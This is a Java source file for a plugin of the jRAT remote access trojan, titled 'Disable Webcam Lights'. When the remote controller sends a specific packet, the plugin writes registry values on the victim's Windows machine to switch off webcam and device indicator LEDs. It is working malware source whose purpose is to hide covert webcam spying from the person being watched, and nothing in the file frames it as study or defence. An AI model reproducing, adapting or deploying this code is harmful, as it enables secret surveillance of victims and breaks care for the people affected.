package jrat.plugin.dwl.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.stub.StubPlugin;

public class DWLPlugin extends StubPlugin {

	public static final short HEADER = 110;

	public static boolean enabled;

	private DataInputStream in;
	
	public void onEnable() throws Exception {

	}

	public void onDisconnect(Exception ex) {

	}

	public void onConnect(DataInputStream in, DataOutputStream out) {
		this.in = in;
	}

	public void onPacket(short header) throws Exception {
		if (header == HEADER) {
			boolean enable = in.readBoolean();

			String sdef = enable ? "5" : "0";
			String ledmode = enable ? "1" : "0";

			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0000\\Settings", "Default", sdef);
			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0001\\Settings", "Default", sdef);
			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0002\\Settings", "Default", sdef);
			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0003\\Settings", "Default", sdef);
			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0004\\Settings", "Default", sdef);
			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0005\\Settings", "Default", sdef);
			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\0015", "LedMode", ledmode);
		}
	}

	@Override
	public String getName() {
		return "Disable Webcam Lights";
	}

	@Override
	public void onStart() {

	}
}
